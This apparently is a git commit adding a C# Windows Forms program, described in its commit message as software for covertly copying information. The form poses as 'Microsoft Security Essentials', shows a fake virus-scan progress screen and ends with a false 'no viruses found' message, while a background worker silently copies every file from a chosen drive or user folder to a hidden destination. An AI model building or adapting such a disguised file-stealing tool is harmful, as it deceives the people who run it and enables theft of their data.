687a3620965ac84d2153f414af34f6ca784379ed
psionika <psionika@bk.ru>
2015-09-04 19:02:22 +0800

    Initial commit
    Программа для скрытного копирования информации

---
+++ Form1.Designer.cs
@@ -0,0 +1,291 @@
+﻿namespace ArxFlashCopy
+{
+    partial class FormMain
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormMain));
+            this.picture1 = new System.Windows.Forms.PictureBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.tableLayoutPanel1 = new System.Windows.Forms.TableLayoutPanel();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.label6 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label7 = new System.Windows.Forms.Label();
+            this.label8 = new System.Windows.Forms.Label();
+            this.labelStartTime = new System.Windows.Forms.Label();
+            this.labelTime = new System.Windows.Forms.Label();
+            this.labelCount = new System.Windows.Forms.Label();
+            this.labelObject = new System.Windows.Forms.Label();
+            this.progressBar1 = new System.Windows.Forms.ProgressBar();
+            this.backgroundWorker = new System.ComponentModel.BackgroundWorker();
+            ((System.ComponentModel.ISupportInitialize)(this.picture1)).BeginInit();
+            this.tableLayoutPanel1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // picture1
+            // 
+            this.picture1.Image = global::ArxFlashCopy.Properties.Resources.fon;
+            this.picture1.Location = new System.Drawing.Point(-1, 1);
+            this.picture1.Name = "picture1";
+            this.picture1.Size = new System.Drawing.Size(800, 546);
+            this.picture1.TabIndex = 0;
+            this.picture1.TabStop = false;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.BackColor = System.Drawing.Color.White;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label1.Location = new System.Drawing.Point(89, 109);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(223, 13);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Выполняется проверка компьютера";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.BackColor = System.Drawing.Color.White;
+            this.label2.Location = new System.Drawing.Point(89, 132);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(427, 13);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "Это может занять некоторое время в зависимости от выбранного типа проверки.";
+            // 
+            // button1
+            // 
+            this.button1.DialogResult = System.Windows.Forms.DialogResult.Cancel;
+            this.button1.Location = new System.Drawing.Point(466, 164);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(150, 30);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "Отменить проверку";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // tableLayoutPanel1
+            // 
+            this.tableLayoutPanel1.BackColor = System.Drawing.Color.White;
+            this.tableLayoutPanel1.ColumnCount = 2;
+            this.tableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 132F));
+            this.tableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100F));
+            this.tableLayoutPanel1.Controls.Add(this.label4, 0, 1);
+            this.tableLayoutPanel1.Controls.Add(this.label5, 0, 2);
+            this.tableLayoutPanel1.Controls.Add(this.label6, 0, 3);
+            this.tableLayoutPanel1.Controls.Add(this.label3, 0, 0);
+            this.tableLayoutPanel1.Controls.Add(this.label7, 0, 4);
+            this.tableLayoutPanel1.Controls.Add(this.label8, 1, 0);
+            this.tableLayoutPanel1.Controls.Add(this.labelStartTime, 1, 1);
+            this.tableLayoutPanel1.Controls.Add(this.labelTime, 1, 2);
+            this.tableLayoutPanel1.Controls.Add(this.labelCount, 1, 3);
+            this.tableLayoutPanel1.Controls.Add(this.labelObject, 1, 4);
+            this.tableLayoutPanel1.Location = new System.Drawing.Point(86, 214);
+            this.tableLayoutPanel1.Name = "tableLayoutPanel1";
+            this.tableLayoutPanel1.RowCount = 5;
+            this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 20F));
+            this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 20F));
+            this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 20F));
+            this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 20F));
+            this.tableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 20F));
+            this.tableLayoutPanel1.Size = new System.Drawing.Size(621, 144);
+            this.tableLayoutPanel1.TabIndex = 3;
+            // 
+            // label4
+            // 
+            this.label4.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.label4.AutoSize = true;
+            this.label4.BackColor = System.Drawing.Color.White;
+            this.label4.Location = new System.Drawing.Point(3, 35);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(81, 13);
+            this.label4.TabIndex = 1;
+            this.label4.Text = "Время начала:";
+            // 
+            // label5
+            // 
+            this.label5.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.label5.AutoSize = true;
+            this.label5.BackColor = System.Drawing.Color.White;
+            this.label5.Location = new System.Drawing.Point(3, 63);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(97, 13);
+            this.label5.TabIndex = 1;
+            this.label5.Text = "Прошло времени:";
+            // 
+            // label6
+            // 
+            this.label6.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.label6.AutoSize = true;
+            this.label6.BackColor = System.Drawing.Color.White;
+            this.label6.Location = new System.Drawing.Point(3, 91);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(117, 13);
+            this.label6.TabIndex = 1;
+            this.label6.Text = "Проверено объектов:";
+            // 
+            // label3
+            // 
+            this.label3.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.label3.AutoSize = true;
+            this.label3.BackColor = System.Drawing.Color.White;
+            this.label3.Location = new System.Drawing.Point(3, 7);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(80, 13);
+            this.label3.TabIndex = 1;
+            this.label3.Text = "Тип проверки:";
+            // 
+            // label7
+            // 
+            this.label7.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.label7.AutoSize = true;
+            this.label7.BackColor = System.Drawing.Color.White;
+            this.label7.Location = new System.Drawing.Point(3, 121);
+            this.label7.Name = "label7";
+            this.label7.Size = new System.Drawing.Size(48, 13);
+            this.label7.TabIndex = 1;
+            this.label7.Text = "Объект:";
+            // 
+            // label8
+            // 
+            this.label8.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.label8.AutoSize = true;
+            this.label8.BackColor = System.Drawing.Color.White;
+            this.label8.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label8.Location = new System.Drawing.Point(135, 7);
+            this.label8.Name = "label8";
+            this.label8.Size = new System.Drawing.Size(51, 13);
+            this.label8.TabIndex = 1;
+            this.label8.Text = "Особая";
+            // 
+            // labelStartTime
+            // 
+            this.labelStartTime.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.labelStartTime.AutoSize = true;
+            this.labelStartTime.BackColor = System.Drawing.Color.White;
+            this.labelStartTime.Location = new System.Drawing.Point(135, 35);
+            this.labelStartTime.Name = "labelStartTime";
+            this.labelStartTime.Size = new System.Drawing.Size(16, 13);
+            this.labelStartTime.TabIndex = 1;
+            this.labelStartTime.Text = "...";
+            // 
+            // labelTime
+            // 
+            this.labelTime.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.labelTime.AutoSize = true;
+            this.labelTime.BackColor = System.Drawing.Color.White;
+            this.labelTime.Location = new System.Drawing.Point(135, 63);
+            this.labelTime.Name = "labelTime";
+            this.labelTime.Size = new System.Drawing.Size(16, 13);
+            this.labelTime.TabIndex = 1;
+            this.labelTime.Text = "...";
+            // 
+            // labelCount
+            // 
+            this.labelCount.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.labelCount.AutoSize = true;
+            this.labelCount.BackColor = System.Drawing.Color.White;
+            this.labelCount.Location = new System.Drawing.Point(135, 91);
+            this.labelCount.Name = "labelCount";
+            this.labelCount.Size = new System.Drawing.Size(16, 13);
+            this.labelCount.TabIndex = 1;
+            this.labelCount.Text = "...";
+            // 
+            // labelObject
+            // 
+            this.labelObject.Anchor = System.Windows.Forms.AnchorStyles.Left;
+            this.labelObject.AutoSize = true;
+            this.labelObject.BackColor = System.Drawing.Color.White;
+            this.labelObject.Location = new System.Drawing.Point(135, 121);
+            this.labelObject.Name = "labelObject";
+            this.labelObject.Size = new System.Drawing.Size(16, 13);
+            this.labelObject.TabIndex = 1;
+            this.labelObject.Text = "...";
+            // 
+            // progressBar1
+            // 
+            this.progressBar1.Location = new System.Drawing.Point(92, 174);
+            this.progressBar1.Name = "progressBar1";
+            this.progressBar1.Size = new System.Drawing.Size(350, 15);
+            this.progressBar1.TabIndex = 4;
+            // 
+            // backgroundWorker
+            // 
+            this.backgroundWorker.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker_DoWork);
+            this.backgroundWorker.ProgressChanged += new System.ComponentModel.ProgressChangedEventHandler(this.backgroundWorker_ProgressChanged);
+            this.backgroundWorker.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(this.backgroundWorker_RunWorkerCompleted);
+            // 
+            // FormMain
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(792, 533);
+            this.Controls.Add(this.progressBar1);
+            this.Controls.Add(this.tableLayoutPanel1);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.picture1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximumSize = new System.Drawing.Size(800, 560);
+            this.MinimumSize = new System.Drawing.Size(800, 560);
+            this.Name = "FormMain";
+            this.Text = "Microsoft Security Essentials";
+            this.Load += new System.EventHandler(this.FormMain_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.picture1)).EndInit();
+            this.tableLayoutPanel1.ResumeLayout(false);
+            this.tableLayoutPanel1.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox picture1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.TableLayoutPanel tableLayoutPanel1;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label7;
+        private System.Windows.Forms.Label label8;
+        private System.Windows.Forms.Label labelStartTime;
+        private System.Windows.Forms.Label labelTime;
+        private System.Windows.Forms.Label labelCount;
+        private System.Windows.Forms.Label labelObject;
+        private System.Windows.Forms.ProgressBar progressBar1;
+        private System.ComponentModel.BackgroundWorker backgroundWorker;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,159 @@
+﻿using System;
+using System.ComponentModel;
+using System.Linq;
+using System.Windows.Forms;
+using System.IO;
+
+namespace ArxFlashCopy
+{
+    public partial class FormMain : Form
+    {
+        public FormMain()
+        {
+            InitializeComponent();
+        }
+
+        void button1_Click(object sender, EventArgs e)
+        {
+            Application.Exit();
+        }
+
+        string source = @"C:\Users\Пользователь\";
+        string destination = @"C:\Temp\";
+
+        void FormMain_Load(object sender, EventArgs e)
+        {
+            labelStartTime.Text = DateTime.Now.ToShortTimeString();
+
+            var arguments = Environment.GetCommandLineArgs();
+
+            if (arguments.Length > 1)
+            {
+                source = arguments[1];
+
+                if (arguments[1].Substring(arguments[1].Length - 1) == "\"")
+                {
+                    source = arguments[1].Substring(0, arguments[1].Length - 1);
+                }
+
+                destination = Properties.Settings.Default.destination;
+
+                //MessageBox.Show("source - " + source + Environment.NewLine + "dest - " + destination);
+
+                backgroundWorker.WorkerReportsProgress = true;
+                backgroundWorker.RunWorkerAsync();
+            }
+            else Application.Exit();
+        }
+
+        public delegate void ProgressChangeDelegate(double Persentage, ref bool Cancel);
+        public delegate void Completedelegate();
+
+        class CustomFileCopier
+        {
+            public event ProgressChangeDelegate OnProgressChanged;
+            public event Completedelegate OnComplete;
+
+            public CustomFileCopier(string Source, string Dest)
+            {
+                SourceFilePath = Source;
+                DestFilePath = Dest;
+
+                OnProgressChanged += delegate { };
+                OnComplete += delegate { };
+            }
+
+            public void Copy()
+            {
+                var buffer = new byte[1024 * 1024]; // 1MB buffer
+                var cancelFlag = false;
+
+                using (FileStream source = new FileStream(SourceFilePath, FileMode.Open, FileAccess.Read))
+                {
+                    var fileLength = source.Length;
+                    using (FileStream dest = new FileStream(DestFilePath, FileMode.CreateNew, FileAccess.Write))
+                    {
+                        long totalBytes = 0;
+                        var currentBlockSize = 0;
+
+                        while ((currentBlockSize = source.Read(buffer, 0, buffer.Length)) > 0)
+                        {
+                            totalBytes += currentBlockSize;
+                            var persentage = (double)totalBytes * 100.0 / fileLength;
+
+                            dest.Write(buffer, 0, currentBlockSize);
+
+                            cancelFlag = false;
+                            OnProgressChanged(persentage, ref cancelFlag);
+
+                            if (cancelFlag)
+                            {
+                                // Delete dest file here
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                OnComplete();
+            }
+
+            public string SourceFilePath { get; set; }
+            public string DestFilePath { get; set; }
+        }
+
+        int fileprogress;
+        int progressMax;
+
+        DateTime dt = DateTime.Now;
+
+        void backgroundWorker_ProgressChanged(object sender, ProgressChangedEventArgs e)
+        {
+            labelObject.Text = e.UserState.ToString();
+            labelCount.Text = fileprogress.ToString();
+            labelTime.Text = DateTime.Now.Subtract(dt).ToString();
+            progressBar1.Maximum = progressMax;
+            progressBar1.Value = fileprogress;
+            progressBar1.Update();
+        }
+
+        void backgroundWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
+        {
+            MessageBox.Show("Проверка закончена - Вирусов не обнаружено!");
+            Application.Exit();
+        }
+
+        void backgroundWorker_DoWork(object sender, DoWorkEventArgs e)
+        {
+
+            var copy_file = new CustomFileCopier("", "");
+
+            var files = Directory.GetFiles(source, "*.*", SearchOption.AllDirectories);
+
+            progressMax = files.Count();
+
+            fileprogress = 0;
+
+            //Now Create all of the directories
+            foreach (string dirPath in Directory.GetDirectories(source, "*",
+                SearchOption.AllDirectories))
+                Directory.CreateDirectory(dirPath.Replace(source, destination));
+
+            //Copy all the files
+            foreach (string newPath in Directory.GetFiles(source, "*.*",
+                SearchOption.AllDirectories))
+            {
+                copy_file.SourceFilePath = newPath;
+                copy_file.DestFilePath = newPath.Replace(source, destination);
+
+                copy_file.Copy();
+
+                fileprogress++;
+
+                backgroundWorker.ReportProgress(fileprogress, newPath);
+            }
+
+        }
+    }
+}
+
